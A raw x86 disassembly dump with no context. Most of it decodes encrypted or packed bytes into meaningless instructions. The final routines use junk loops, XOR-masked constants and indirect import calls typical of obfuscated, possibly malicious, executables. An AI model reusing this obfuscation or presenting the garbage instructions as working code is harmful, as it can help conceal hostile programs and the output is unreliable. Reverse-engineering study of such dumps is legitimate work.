  4229ea:	cmp    BYTE PTR ds:0xa4a71728,cl
  4229f0:	popa   
  4229f1:	sub    al,0x65
  4229f3:	sub    dl,cl
  4229f5:	sub    al,0xda
  4229f7:	mov    al,ds:0x2fcec001
  4229fc:	xor    eax,0x45a7ae2b
  422a01:	dec    ecx
  422a02:	fiadd  DWORD PTR [eax]
  422a04:	jmp    0x42299d
  422a06:	test   eax,0x14c52463
  422a0b:	call   0xa0a83826
  422a10:	inc    esi
  422a11:	push   0x73
  422a13:	adc    ecx,DWORD PTR ds:0x4733e4e3
  422a19:	mov    bh,0x6d
  422a1b:	adc    BYTE PTR [eax+0x63115f2],al
  422a21:	aas    
  422a22:	or     ch,BYTE PTR [ebx+0x3b]
  422a25:	stc    
  422a26:	jnp    0x422a60
  422a28:	cmc    
  422a29:	test   ah,cl
  422a2b:	test   BYTE PTR [ecx+0x15],ch
  422a2e:	sub    dl,ah
  422a30:	out    dx,eax
  422a31:	and    DWORD PTR [esi+0x13f70184],ebp
  422a37:	sbb    BYTE PTR [edx-0x64beffc9],al
  422a3d:	fsub   QWORD PTR [edi]
  422a3f:	dec    edi
  422a40:	cld    
  422a41:	and    esi,ebx
  422a43:	mov    al,0x22
  422a45:	bound  ecx,QWORD PTR [eax+ebx*4+0x1b]
  422a49:	cmc    
  422a4a:	mov    edx,0xabab337f
  422a4f:	jge    0x422a5f
  422a51:	sbb    ecx,esp
  422a53:	call   0xe92e96a2
  422a58:	in     eax,dx
  422a59:	(bad)  
  422a5a:	(bad)  
  422a5b:	cld    
  422a5c:	fsubr  st(7),st
  422a5e:	cmp    al,0x8d
  422a60:	popa   
  422a61:	dec    ebx
  422a62:	or     dh,bl
  422a64:	(bad)  
  422a65:	pop    eax
  422a66:	cli    
  422a67:	nop
  422a68:	mov    ch,bh
  422a6a:	cmp    eax,0x501cf209
  422a6f:	sub    esi,DWORD PTR [ecx-0xf]
  422a72:	sbb    al,0xf
  422a74:	push   ecx
  422a75:	jae    0x422ac9
  422a77:	(bad)  
  422a78:	aam    0x3b
  422a7a:	add    DWORD PTR [edx+0xdaac83f],eax
  422a80:	mov    bl,0x9e
  422a82:	imul   edi,DWORD PTR [eax],0x8fd03bfc
  422a88:	xchg   BYTE PTR [edx+0x14],ch
  422a8b:	dec    ecx
  422a8c:	pusha  
  422a8d:	test   DWORD PTR [ecx+0x7a],ecx
  422a90:	es stc 
  422a92:	sbb    DWORD PTR [ebx-0x710b18c1],edi
  422a98:	inc    esi
  422a99:	mov    ebp,0xbab3dcf4
  422a9e:	xchg   edi,eax
  422a9f:	jecxz  0x422b09
  422aa1:	mov    dh,0x7c
  422aa3:	pusha  
  422aa4:	mov    edx,0x59e60d68
  422aa9:	(bad)  
  422aaa:	rol    DWORD PTR [edx-0x7a500bde],cl
  422ab0:	push   esi
  422ab1:	pop    edx
  422ab2:	lods   al,BYTE PTR ds:[esi]
  422ab3:	mov    cl,0x1
  422ab5:	mov    ebx,0x9d00cb4c
  422aba:	dec    ecx
  422abb:	and    eax,0x78f72eeb
  422ac0:	add    eax,0x2503d2da
  422ac5:	call   0x2f98:0x5d10dd87
  422acc:	xchg   BYTE PTR [edx],cl
  422ace:	pop    ebx
  422acf:	or     eax,0xabdb819b
  422ad4:	pop    esi
  422ad5:	(bad)  
  422ad6:	fsub   DWORD PTR [ebx]
  422ad8:	cmp    bl,BYTE PTR [eax+0x52]
  422adb:	enter  0xcde2,0x46
  422adf:	mov    eax,ds:0xf51d5aca
  422ae4:	call   0x7e55:0x461eacae
  422aeb:	cld    
  422aec:	fucom  st(5)
  422aee:	lock rol DWORD PTR [ebx],1
  422af1:	mov    edx,0x47025cfa
  422af6:	push   es
  422af7:	imul   eax,ebx,0xffffffea
  422afa:	test   al,0x48
  422afc:	in     al,dx
  422afd:	sbb    eax,0xe9e9fcc1
  422b02:	enter  0x41ca,0xf2
  422b06:	pusha  
  422b07:	gs inc esp
  422b09:	lock ror DWORD PTR [eax-0x748bb109],0x23
  422b11:	mov    cl,0xc9
  422b13:	dec    ecx
  422b14:	mov    ebx,DWORD PTR [edi]
  422b16:	xchg   BYTE PTR [edi+0x23fe4157],ah
  422b1c:	out    dx,al
  422b1d:	adc    ch,al
  422b1f:	add    eax,0xfc478ea2
  422b24:	and    ebp,DWORD PTR [eax+0x11]
  422b27:	mov    ds:0xfb786945,al
  422b2c:	or     eax,0x75278edd
  422b31:	xchg   ecx,eax
  422b32:	push   es
  422b33:	ret    
  422b34:	dec    esi
  422b35:	add    eax,0xf03ec70a
  422b3a:	xchg   edi,eax
  422b3b:	push   edx
  422b3c:	lods   eax,DWORD PTR ds:[esi]
  422b3d:	ds ins BYTE PTR es:[edi],dx
  422b3f:	cmp    BYTE PTR [edx+0x64fa1db],0xa7
  422b46:	mov    ah,0x4b
  422b48:	push   esi
  422b49:	and    esp,ebp
  422b4b:	mov    BYTE PTR [esp+esi*4+0x590ae05],dh
  422b52:	and    ecx,ecx
  422b54:	iret   
  422b55:	pop    ebx
  422b56:	dec    eax
  422b57:	ja     0x422b08
  422b59:	aam    0x6c
  422b5b:	test   DWORD PTR [edi-0x9b5fab2],ecx
  422b61:	jmp    0x87:0x43d80a3d
  422b68:	outs   dx,DWORD PTR ds:[esi]
  422b69:	call   0x4ecb:0x7ce3120
  422b70:	pop    ecx
  422b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b72:	lock (bad) 
  422b74:	dec    ecx
  422b75:	cwde   
  422b76:	leave  
  422b77:	sti    
  422b78:	mov    ds:0xe242ef80,al
  422b7d:	inc    esi
  422b7e:	mov    ds:0x11183813,al
  422b83:	or     DWORD PTR [ebx],0xffffff97
  422b86:	mov    cs,WORD PTR [eax+0x77]
  422b89:	xor    esi,DWORD PTR [eax+0x7fdd8289]
  422b8f:	sahf   
  422b90:	rcl    DWORD PTR [esi],1
  422b92:	clc    
  422b93:	mov    bl,cl
  422b95:	shl    BYTE PTR [ebp-0x5f62e775],cl
  422b9b:	fcomp  QWORD PTR [eax+0x72]
  422b9e:	mov    dl,0xfc
  422ba0:	cmp    edx,DWORD PTR [edx-0x31]
  422ba3:	push   ecx
  422ba4:	cs pusha 
  422ba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ba7:	xchg   edi,eax
  422ba8:	mov    cl,0x5f
  422baa:	lea    edx,[ebx+0x57091e84]
  422bb0:	leave  
  422bb1:	gs ret 0x8773
  422bb5:	outs   dx,BYTE PTR ds:[esi]
  422bb6:	adc    BYTE PTR [edx+esi*1],ch
  422bb9:	mov    es,WORD PTR [esp+edi*2+0x1b]
  422bbd:	int3   
  422bbe:	xor    bl,BYTE PTR [esi-0x65]
  422bc1:	mov    ah,0xa3
  422bc3:	or     ebp,DWORD PTR [esi+0x2a9a3545]
  422bc9:	mov    bl,0x6e
  422bcb:	addr16 and eax,0x7fdee274
  422bd1:	push   eax
  422bd2:	aaa    
  422bd3:	lock mov ebx,0x10ae518e
  422bd9:	sub    DWORD PTR [eax*1-0x30b6ac9b],ecx
  422be0:	js     0x422c3a
  422be2:	xor    al,0x11
  422be4:	call   0x8ec7:0xdfaeefd9
  422beb:	fidivr WORD PTR [ecx]
  422bed:	cwde   
  422bee:	lods   eax,DWORD PTR ds:[esi]
  422bef:	xchg   DWORD PTR ds:[ebp+0x635379e9],edx
  422bf6:	nop    DWORD PTR [esi]
  422bf9:	xchg   edi,eax
  422bfa:	cld    
  422bfb:	dec    ebp
  422bfc:	jae    0x422bc4
  422bfe:	add    al,0xa8
  422c00:	jp     0x422c80
  422c02:	mov    ebx,0xc652ec12
  422c07:	les    edi,FWORD PTR [ebx]
  422c09:	push   esi
  422c0a:	mov    bh,0xd6
  422c0c:	jle    0x422c10
  422c0e:	mov    ebx,0xd2ce379a
  422c13:	(bad)  
  422c14:	xchg   ebp,eax
  422c15:	sahf   
  422c16:	cmp    al,bl
  422c18:	hlt    
  422c19:	aad    0x36
  422c1b:	or     al,0xa1
  422c1d:	lods   eax,DWORD PTR ds:[esi]
  422c1e:	fcom   QWORD PTR [ebx]
  422c20:	fld    QWORD PTR [eax+eax*2+0x13]
  422c24:	and    DWORD PTR [edi],edi
  422c26:	push   cs
  422c27:	adc    cl,BYTE PTR [ebx]
  422c29:	jo     0x422c3c
  422c2b:	sahf   
  422c2c:	std    
  422c2d:	int    0x54
  422c2f:	sub    BYTE PTR [edi-0xd],0x7b
  422c33:	add    bl,BYTE PTR [ecx-0x2999c7c2]
  422c39:	sub    dl,BYTE PTR [ecx-0x398a93ef]
  422c3f:	shl    BYTE PTR [eax],cl
  422c41:	stos   BYTE PTR es:[edi],al
  422c42:	push   esi
  422c43:	jmp    0x422c7a
  422c45:	aaa    
  422c46:	jmp    0x38dd:0x9b461716
  422c4d:	in     eax,0x58
  422c4f:	pop    ebp
  422c50:	jecxz  0x422c3d
  422c52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c53:	sbb    DWORD PTR [ebp-0x57],ecx
  422c56:	or     eax,0xffffffc2
  422c59:	pop    esi
  422c5a:	add    al,0xf9
  422c5c:	ror    BYTE PTR cs:[ebx+0x3680ccb5],cl
  422c63:	ss adc eax,0x67a29100
  422c69:	(bad)  
  422c6a:	pop    ss
  422c6b:	and    esi,esi
  422c6d:	xlat   BYTE PTR ds:[ebx]
  422c6e:	sahf   
  422c6f:	ret    
  422c70:	clc    
  422c71:	sbb    al,0x61
  422c73:	outs   dx,BYTE PTR ds:[esi]
  422c74:	cli    
  422c75:	int3   
  422c76:	ja     0x422c22
  422c78:	xchg   edx,eax
  422c79:	mov    edi,0x1209c346
  422c7e:	dec    ecx
  422c7f:	dec    eax
  422c80:	das    
  422c81:	es add esp,eax
  422c84:	jmp    0xf26275db
  422c89:	inc    edx
  422c8a:	mov    BYTE PTR gs:[esp+ebx*2+0xe],ah
  422c8f:	xor    eax,0x347995b8
  422c94:	lock ins BYTE PTR es:[edi],dx
  422c96:	rol    DWORD PTR [edi+edx*2-0x4f],1
  422c9a:	push   ds
  422c9b:	jae    0x422ced
  422c9d:	xchg   BYTE PTR [esi+0x7241707e],bl
  422ca3:	test   edx,esi
  422ca5:	sbb    BYTE PTR [ecx-0x766e78cd],bl
  422cab:	dec    esi
  422cac:	pop    ebp
  422cad:	and    eax,0x14749e16
  422cb2:	loope  0x422c34
  422cb4:	add    eax,0xfb8ffbcf
  422cba:	add    al,0x95
  422cbc:	aad    0xf3
  422cbe:	jge    0x422d32
  422cc0:	mov    ebx,esp
  422cc2:	mov    edi,0x47a52ad6
  422cc7:	out    0x14,eax
  422cc9:	inc    esp
  422cca:	push   ss
  422ccb:	mov    dl,0x91
  422ccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cce:	push   0x79
  422cd0:	xchg   esp,eax
  422cd1:	dec    esp
  422cd2:	lds    esp,FWORD PTR [ecx]
  422cd4:	imul   ebx,DWORD PTR [eax-0x19422e31],0xffffffc4
  422cdb:	jbe    0x422ced
  422cdd:	jb     0x422cf6
  422cdf:	and    al,0x7a
  422ce1:	jmp    0x9f3f770f
  422ce6:	pop    eax
  422ce7:	cmp    al,BYTE PTR [esp+0x15]
  422ceb:	xchg   esi,eax
  422cec:	fwait
  422ced:	mov    ebp,0x45a92cd2
  422cf2:	pop    ebp
  422cf3:	sbb    al,0x20
  422cf5:	std    
  422cf6:	mov    al,0x50
  422cf8:	stc    
  422cf9:	pop    es
  422cfa:	loop   0x422d1f
  422cfc:	adc    edx,DWORD PTR [esi]
  422cfe:	jbe    0x422cf7
  422d00:	push   ebx
  422d01:	repz fadd DWORD PTR [ebp+0x56]
  422d05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d06:	cld    
  422d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d08:	stc    
  422d09:	mov    BYTE PTR [edx],dl
  422d0b:	and    al,0xdc
  422d0d:	mov    ds:0x78f6a84f,al
  422d12:	icebp  
  422d13:	add    eax,DWORD PTR [eax+0x2f8c5379]
  422d19:	inc    edi
  422d1a:	xor    DWORD PTR [ecx-0x4e],eax
  422d1d:	adc    edi,esp
  422d1f:	addr16 vsubps ymm2,ymm4,ymm6
  422d24:	and    ebp,0x39129a40
  422d2a:	mov    dh,0xa1
  422d2c:	sti    
  422d2d:	adc    esp,DWORD PTR [esi+0x3f308896]
  422d33:	mov    WORD PTR [ecx-0x43ff07f8],fs
  422d39:	(bad)  
  422d3b:	add    dh,BYTE PTR [edx+ecx*8+0x554d372f]
  422d42:	mov    bh,0x70
  422d44:	mov    ds:0xeb54aa12,al
  422d49:	and    BYTE PTR [edx],bl
  422d4b:	xor    ah,ch
  422d4d:	ror    DWORD PTR [ebx],0x4e
  422d50:	mov    ecx,0xed96216c
  422d55:	mov    bh,0x1
  422d57:	lds    ebp,FWORD PTR [edi+0x34]
  422d5a:	sub    al,0x35
  422d5c:	push   eax
  422d5d:	(bad)  
  422d5e:	jecxz  0x422cfc
  422d60:	and    eax,0x35ba4f43
  422d65:	popf   
  422d66:	(bad)  
  422d67:	or     DWORD PTR [eax+eax*2-0x58],edx
  422d6b:	cmp    BYTE PTR [ebp+0x51a1cf42],cl
  422d71:	mov    eax,ds:0x9824803
  422d76:	test   eax,0xb4f3a836
  422d7b:	aaa    
  422d7c:	sahf   
  422d7d:	sbb    DWORD PTR [ebp+0x63],0x3fcac65d
  422d84:	int    0x56
  422d86:	mov    DWORD PTR [edi+0x72cdddfd],ebp
  422d8c:	mov    BYTE PTR es:0x517faf68,cl
  422d93:	shl    DWORD PTR [ebp-0x7c],0x82
  422d97:	retf   0xbdc9
  422d9a:	stos   BYTE PTR es:[edi],al
  422d9b:	sbb    eax,0x2c598690
  422da0:	push   ecx
  422da1:	xor    ch,BYTE PTR [esi-0x49]
  422da4:	pop    edx
  422da5:	jne    0x422ddb
  422da7:	mov    bh,0x5b
  422da9:	jb     0x422d75
  422dab:	call   0x4880f5ea
  422db0:	call   eax
  422db2:	fild   QWORD PTR ds:0xab7966b8
  422db8:	fcomi  st,st(5)
  422dba:	retf   
  422dbb:	cld    
  422dbc:	or     al,0x37
  422dbe:	(bad)  
  422dbf:	xor    esp,DWORD PTR [ebp+0x67b19e0]
  422dc5:	jge    0x422d55
  422dc7:	lahf   
  422dc8:	fisubr DWORD PTR [edi+0x1300e4a]
  422dce:	lods   al,BYTE PTR ds:[esi]
  422dcf:	jmp    0x3d455ea6
  422dd4:	xchg   edx,eax
  422dd5:	sbb    dh,ah
  422dd7:	(bad)  
  422dd8:	xchg   edx,eax
  422dd9:	push   esi
  422dda:	pop    bp
  422ddc:	lahf   
  422ddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dde:	jmp    0xa9ef:0x8e40665b
  422de5:	jo     0x422dc5
  422de7:	call   0xbabb:0x3ec2e064
  422dee:	cmp    al,0x86
  422df0:	jmp    0x422e58
  422df2:	inc    DWORD PTR [eax+edi*4+0x47]
  422df6:	popa   
  422df7:	xchg   edi,eax
  422df8:	xchg   DWORD PTR [eax+0x18],edi
  422dfb:	pusha  
  422dfc:	sub    al,0x90
  422dfe:	pop    eax
  422dff:	push   esi
  422e00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e01:	mov    esp,0x154300ce
  422e06:	mov    dl,ch
  422e08:	inc    edx
  422e09:	aas    
  422e0a:	lods   al,BYTE PTR ds:[esi]
  422e0b:	ret    
  422e0c:	(bad)  
  422e0d:	out    dx,eax
  422e0e:	or     BYTE PTR [ebp+0x1f87b268],dl
  422e14:	mov    edx,0x5a34c97b
  422e19:	dec    ebp
  422e1a:	data16 je 0x422e2e
  422e1d:	add    BYTE PTR [edi],ch
  422e1f:	cld    
  422e20:	push   es
  422e21:	sbb    eax,0x2d4a190d
  422e26:	fmul   DWORD PTR [ecx-0x1c817372]
  422e2c:	popf   
  422e2d:	sub    dh,BYTE PTR [edi-0xcf30383]
  422e33:	ins    BYTE PTR es:[edi],dx
  422e34:	popf   
  422e35:	or     al,0xd0
  422e37:	jae    0x422e48
  422e39:	adc    bl,BYTE PTR [edi-0x1f]
  422e3c:	cli    
  422e3d:	inc    edx
  422e3e:	add    DWORD PTR [edx+edx*1+0x4b6eea27],eax
  422e45:	and    eax,0x5f8f752
  422e4a:	mov    ecx,0x514cb2d
  422e4f:	call   0xfb8d0847
  422e54:	gs pop es
  422e56:	push   edx
  422e58:	adc    al,0xb2
  422e5a:	mov    bl,0x17
  422e5c:	sub    al,ah
  422e5e:	sub    eax,DWORD PTR ds:[esi+0x6d]
  422e62:	leave  
  422e63:	add    BYTE PTR [ebx-0x35],bh
  422e66:	mov    ebp,0x39bd900d
  422e6b:	fidivr WORD PTR [ecx+0x2df857c2]
  422e71:	xchg   BYTE PTR [ecx+0x4b],dh
  422e74:	or     al,0x94
  422e76:	add    ebx,DWORD PTR [ebp-0x395ae62]
  422e7c:	xchg   DWORD PTR [ebp+0x14ba8ef7],ebx
  422e82:	out    dx,al
  422e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e84:	dec    ecx
  422e85:	daa    
  422e86:	out    0xf8,eax
  422e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e89:	mov    ebx,0xda1f3d71
  422e8e:	lds    ecx,FWORD PTR ds:0xe7835c3
  422e94:	sub    eax,0xc7b251cd
  422e99:	pop    ecx
  422e9a:	sbb    al,0xbb
  422e9c:	jae    0x422e48
  422e9e:	sub    al,0x62
  422ea0:	aaa    
  422ea1:	push   ds
  422ea2:	add    edi,DWORD PTR [ebx]
  422ea4:	mov    BYTE PTR [ecx],cl
  422ea6:	inc    esi
  422ea7:	push   cs
  422ea8:	dec    ebx
  422ea9:	xchg   esi,eax
  422eaa:	stos   DWORD PTR es:[edi],eax
  422eab:	jp     0x422ee8
  422ead:	sub    al,0x4f
  422eaf:	sti    
  422eb0:	(bad)  
  422eb1:	mov    edx,0xff10f9bf
  422eb6:	aaa    
  422eb7:	stos   BYTE PTR es:[edi],al
  422eb8:	mov    ebx,0xac9d24d0
  422ebd:	jmp    0xa50a1dc2
  422ec2:	jmp    0x37f8:0xcb2fe690
  422ec9:	call   0x7137f6e8
  422ece:	stc    
  422ecf:	inc    edx
  422ed0:	jmp    0x422ef5
  422ed2:	jge    0x422f4d
  422ed4:	pop    edi
  422ed5:	mov    ds:0x87dd797f,eax
  422eda:	xor    al,0xf
  422edc:	or     DWORD PTR [esi-0x58],ebx
  422edf:	(bad)  
  422ee0:	mov    DWORD PTR [esi+0x71],ebx
  422ee3:	cmp    ecx,DWORD PTR [edi+0x4063847e]
  422ee9:	cli    
  422eea:	fstp   TBYTE PTR [eax-0x1d]
  422eed:	popa   
  422eee:	dec    ebp
  422eef:	push   cs
  422ef0:	in     eax,0x66
  422ef2:	ret    0xa47a
  422ef5:	mov    al,0xa0
  422ef7:	jbe    0x422f47
  422ef9:	popf   
  422efa:	jmp    DWORD PTR [ebx+0x20]
  422efd:	sahf   
  422efe:	(bad)  
  422eff:	fs sbb cl,dh
  422f02:	cmc    
  422f03:	adc    eax,0x5dda8597
  422f08:	xor    eax,0x2a327012
  422f0d:	retf   
  422f0e:	add    bh,BYTE PTR [edx+0xb18f449]
  422f14:	adc    BYTE PTR [ebp+0x45156683],ah
  422f1a:	mov    edx,0x6b7d5157
  422f1f:	shr    DWORD PTR [eax],1
  422f21:	sbb    BYTE PTR [esi-0x41d0fec3],ah
  422f27:	mov    esp,0xf7bf4ebb
  422f2c:	add    eax,0xe0903485
  422f31:	add    si,WORD PTR [ecx+0x222a455]
  422f38:	sbb    al,BYTE PTR [edi]
  422f3a:	test   al,0x80
  422f3c:	pop    esp
  422f3d:	jo     0x422ebf
  422f3f:	fild   WORD PTR [esi-0xe0796bd]
  422f45:	inc    esp
  422f46:	mov    ds:0xdce759f1,al
  422f4b:	sbb    bl,BYTE PTR [ecx+0x50]
  422f4e:	adc    bl,BYTE PTR [edx+0x42]
  422f51:	cmc    
  422f52:	ds repz xchg ecx,eax
  422f55:	jno    0x422f88
  422f57:	test   eax,0x54b0106b
  422f5c:	ror    DWORD PTR [edx+0x154a0c7c],cl
  422f62:	jecxz  0x422fae
  422f64:	int3   
  422f65:	cmc    
  422f66:	repnz cmp ecx,DWORD PTR [eax+0x23cf0369]
  422f6d:	retf   0x4d89
  422f70:	mov    ah,0x8b
  422f72:	dec    ebp
  422f73:	or     BYTE PTR [ebx-0x737247ab],cl
  422f79:	or     bl,bh
  422f7b:	cld    
  422f7c:	inc    ecx
  422f7d:	add    cl,BYTE PTR [ecx+0x4d8bb84d]
  422f83:	or     BYTE PTR [edx-0x5a1eadc],bh
  422f89:	sub    edx,ecx
  422f8b:	add    edx,DWORD PTR [ebp-0x44]
  422f8e:	mov    DWORD PTR [ebp-0x44],edx
  422f91:	mov    ecx,DWORD PTR [ebp+0x8]
  422f94:	xor    ecx,eax
  422f96:	add    ecx,esi
  422f98:	jne    0x421ef2
  422f9e:	mov    ecx,DWORD PTR [ebp-0x8]
  422fa1:	xor    ecx,eax
  422fa3:	mov    eax,DWORD PTR [ebp+0x10]
  422fa6:	add    ecx,esi
  422fa8:	mov    DWORD PTR [eax],ecx
  422faa:	pop    edi
  422fab:	pop    esi
  422fac:	pop    ebx
  422fad:	leave  
  422fae:	ret    0xc
  422fb1:	push   ebp
  422fb2:	mov    ebp,esp
  422fb4:	sub    esp,0x78
  422fb7:	and    DWORD PTR ds:0x42a2e2,0x0
  422fc1:	jmp    0x422fd3
  422fc6:	mov    ecx,DWORD PTR ds:0x42a2e2
  422fcc:	inc    ecx
  422fcd:	mov    DWORD PTR ds:0x42a2e2,ecx
  422fd3:	cmp    DWORD PTR ds:0x42a2e2,0x17
  422fda:	jae    0x423027
  422fe0:	cmp    DWORD PTR ds:0x42a2e2,0xb
  422fe7:	jbe    0x423027
  422fed:	jmp    0x423008
  422ff2:	push   DWORD PTR [ebp-0x14]
  422ff5:	push   0x42a2be
  422ffa:	push   0x8b21
  422fff:	push   DWORD PTR [ebp-0x1c]
  423002:	call   DWORD PTR ds:0x42a3d2
  423008:	cmp    DWORD PTR ds:0x42a2e2,0xa
  42300f:	jne    0x423022
  423015:	mov    ecx,DWORD PTR ds:0x42a2e2
  42301b:	inc    ecx
  42301c:	mov    DWORD PTR ds:0x42a2e2,ecx
  423022:	jmp    0x422fc6
  423027:	push   esi
  423028:	sbb    DWORD PTR ds:0x42a26e,edx
  42302e:	push   edi
  42302f:	adc    esi,eax
  423031:	mov    eax,ds:0x42941e
  423036:	inc    DWORD PTR ds:0x42a2ae
  42303c:	mov    DWORD PTR [ebp-0x24],eax
  42303f:	mov    DWORD PTR ds:0x42a286,0x12e2
  423049:	mov    eax,ds:0x42953e
  42304e:	inc    ecx
  42304f:	mov    DWORD PTR [ebp-0x30],eax
  423052:	mov    DWORD PTR ds:0x42a29e,0x10
  42305c:	cmp    DWORD PTR ds:0x42a29e,0x0
  423063:	je     0x4230c5
  423069:	cmp    DWORD PTR ds:0x42a29e,0x9
  423070:	jbe    0x4230c5
  423076:	jmp    0x42309a
  42307b:	push   DWORD PTR [ebp-0x24]
  42307e:	push   DWORD PTR [ebp-0x18]
  423081:	push   DWORD PTR [ebp-0xc]
  423084:	push   0x10f9
  423089:	push   DWORD PTR [ebp-0x28]
  42308c:	push   DWORD PTR [ebp-0x18]
  42308f:	push   0x429211
  423094:	call   DWORD PTR ds:0x42a3d6
  42309a:	cmp    DWORD PTR ds:0x42a29e,0xa
  4230a1:	jne    0x4230b5
  4230a7:	xor    eax,eax
  4230a9:	xor    eax,DWORD PTR ds:0x42a29e
  4230af:	dec    eax
  4230b0:	mov    ds:0x42a29e,eax
  4230b5:	mov    eax,ds:0x42a29e
  4230ba:	dec    eax
  4230bb:	mov    ds:0x42a29e,eax
  4230c0:	jmp    0x42305c
  4230c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4230cc:	mov    DWORD PTR ds:0x42a26a,0x16
  4230d6:	cmp    DWORD PTR ds:0x42a26a,0x0
  4230dd:	je     0x42310f
  4230e3:	cmp    DWORD PTR ds:0x42a26a,0x20
  4230ea:	jg     0x42310f
  4230f0:	jmp    0x4230fb
  4230f5:	call   DWORD PTR ds:0x42a3da
  4230fb:	xor    edi,edi
  4230fd:	add    edi,DWORD PTR ds:0x42a26a
  423103:	dec    edi
  423104:	mov    DWORD PTR ds:0x42a26a,edi
  42310a:	jmp    0x4230d6
  42310f:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  423116:	mov    eax,DWORD PTR [ebp-0x10]
  423119:	mov    ecx,DWORD PTR [ebp-0x10]
  42311c:	xor    esi,esi
  42311e:	xor    esi,DWORD PTR ds:0x42a286
  423124:	xor    DWORD PTR ds:0x42a2f6,esi
  42312a:	sub    eax,ecx
  42312c:	or     ecx,esi
  42312e:	mov    DWORD PTR [ebp-0x10],eax
  423131:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  423138:	add    DWORD PTR ds:0x42a26a,0x2e29
  423142:	mov    eax,DWORD PTR [ebp-0x18]
  423145:	sbb    DWORD PTR ds:0x42a272,0x6ecf
  42314f:	mov    ecx,DWORD PTR [ebp-0x18]
  423152:	add    DWORD PTR ds:0x42a256,0x42a29a
  42315c:	sub    eax,ecx
  42315e:	adc    DWORD PTR ds:0x42a302,edi
  423164:	mov    DWORD PTR [ebp-0x18],eax
  423167:	add    DWORD PTR ds:0x42a2fe,ecx
  42316d:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  423174:	adc    DWORD PTR ds:0x42a26a,0x287e
  42317e:	mov    eax,DWORD PTR [ebp-0xc]
  423181:	adc    esi,esi
  423183:	mov    ecx,DWORD PTR [ebp-0xc]
  423186:	sub    eax,ecx
  423188:	xor    DWORD PTR ds:0x42a2b6,0x51ed
  423192:	mov    DWORD PTR [ebp-0xc],eax
  423195:	and    DWORD PTR ds:0x42a2ae,0x0
  42319f:	mov    edi,DWORD PTR ds:0x42a2ae
  4231a5:	inc    edi
  4231a6:	mov    DWORD PTR ds:0x42a2ae,edi
  4231ac:	cmp    DWORD PTR ds:0x42a2ae,0xd
  4231b3:	ja     0x4231fd
  4231b9:	jmp    0x4231d4
  4231be:	push   DWORD PTR [ebp-0x1c]
  4231c1:	push   0x7962
  4231c6:	push   0x7f76
  4231cb:	push   DWORD PTR [ebp-0x20]
  4231ce:	call   DWORD PTR ds:0x42a3de
  4231d4:	cmp    DWORD PTR ds:0x42a2ae,0xc
  4231db:	jne    0x4231f0
  4231e1:	xor    edi,edi
  4231e3:	xor    edi,DWORD PTR ds:0x42a2ae
  4231e9:	inc    edi
  4231ea:	mov    DWORD PTR ds:0x42a2ae,edi
  4231f0:	cmp    DWORD PTR ds:0x42a2ae,0x18
  4231f7:	jb     0x42319f
  4231fd:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  423204:	adc    esi,edi
  423206:	mov    eax,DWORD PTR [ebp-0x1c]
  423209:	mov    ecx,DWORD PTR [ebp-0x1c]
  42320c:	sub    eax,ecx
  42320e:	mov    DWORD PTR [ebp-0x1c],eax
  423211:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  423218:	mov    eax,DWORD PTR [ebp-0x20]
  42321b:	mov    ecx,DWORD PTR [ebp-0x20]
  42321e:	sub    eax,ecx
  423220:	mov    DWORD PTR [ebp-0x20],eax
  423223:	mov    eax,DWORD PTR [ebp-0x2c]
  423226:	mov    ecx,DWORD PTR [ebp-0x20]
  423229:	mov    esi,0x75108aa
  42322e:	xor    eax,esi
  423230:	mov    edi,0x3272f1
  423235:	add    eax,edi
  423237:	or     eax,ecx
  423239:	mov    DWORD PTR [ebp-0x20],eax
  42323c:	mov    eax,DWORD PTR [ebp-0x4]
  42323f:	mov    ecx,DWORD PTR [ebp-0x4]
  423242:	sub    eax,ecx
  423244:	mov    DWORD PTR [ebp-0x4],eax
  423247:	or     DWORD PTR [ebp-0x4],0xf89c85be
  42324e:	mov    eax,DWORD PTR [ebp-0xc]
  423251:	xor    eax,esi
  423253:	add    eax,edi
  423255:	push   eax
  423256:	mov    eax,DWORD PTR [ebp-0x10]
  423259:	xor    eax,esi
  42325b:	add    eax,edi
  42325d:	push   eax
  42325e:	mov    eax,DWORD PTR [ebp-0x4]
  423261:	xor    eax,esi
  423263:	add    eax,edi
  423265:	push   eax
  423266:	lea    eax,[ebp-0x78]
  423269:	push   eax
  42326a:	push   DWORD PTR [ebp-0x2c]
  42326d:	push   DWORD PTR [ebp-0x28]
  423270:	call   0x413da8
  423275:	test   eax,eax
  423277:	je     0x4232a5
  42327d:	lea    eax,[ebp-0x78]
  423280:	push   eax
  423281:	mov    eax,DWORD PTR [ebp-0x28]
  423284:	xor    eax,esi
  423286:	add    eax,edi
  423288:	push   eax
  423289:	mov    eax,DWORD PTR [ebp-0x24]
  42328c:	add    eax,0xaa
  423291:	push   eax
  423292:	mov    eax,DWORD PTR [ebp-0x24]
  423295:	mov    eax,DWORD PTR [eax+0x198]
  42329b:	push   DWORD PTR [eax]
  42329d:	call   0x4084f6
  4232a2:	mov    DWORD PTR [ebp-0x14],eax
  4232a5:	mov    ecx,DWORD PTR ds:0x429516
  4232ab:	lea    eax,[ebp+0x4]
  4232ae:	mov    DWORD PTR [ecx*4+0x42950e],eax
  4232b5:	inc    DWORD PTR ds:0x429516
  4232bb:	mov    eax,DWORD PTR [ebp-0x14]
  4232be:	test   eax,eax
  4232c0:	je     0x423328
  4232c6:	lea    eax,[ebp-0x8]
  4232c9:	mov    DWORD PTR [ebp-0x34],eax
  4232cc:	mov    eax,DWORD PTR [ebp-0x30]
  4232cf:	mov    DWORD PTR [ebp-0x8],eax
  4232d2:	mov    eax,DWORD PTR [ebp-0x8]
